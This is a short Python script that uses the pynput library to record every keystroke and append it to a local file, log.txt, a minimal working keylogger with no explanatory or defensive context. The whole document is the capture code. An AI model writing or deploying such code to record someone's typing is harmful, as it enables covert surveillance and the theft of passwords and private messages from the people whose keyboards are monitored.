from pynput.keyboard import Listener


def addtofile(key):
    keydata=str(key)
    with open("log.txt",'a') as f:
        f.write(keydata)




with Listener(on_press=addtofile) as l:
    l.join(timeout= 2)
